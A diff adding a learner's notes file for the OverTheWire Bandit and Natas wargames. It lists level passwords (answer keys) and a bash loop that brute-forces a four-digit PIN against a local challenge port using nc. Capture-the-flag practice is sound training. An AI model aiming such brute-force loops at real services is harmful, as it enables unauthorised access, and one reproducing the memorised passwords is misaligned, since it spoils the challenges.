@@ -1,0 +1,45 @@
+SSH Information
+Host: bandit.labs.overthewire.org
+Port: 2220
+
+bandit16
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+bandit19
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+bandit21
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+bandit22
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+bandit23
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+bandit24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+#!/bin/bash
+passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+for a in {0..9}{0..9}{0..9}{0..9}
+do
+        echo $passwd' '$a | nc localhost 30002 >> result &
+done
+
+$sort result | uniq -u
+
+bandit25
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+=================natas================
+natas1: gtVrDuiDfck831PqWsLEZy5gyDz1clto
+natas2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+natas4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
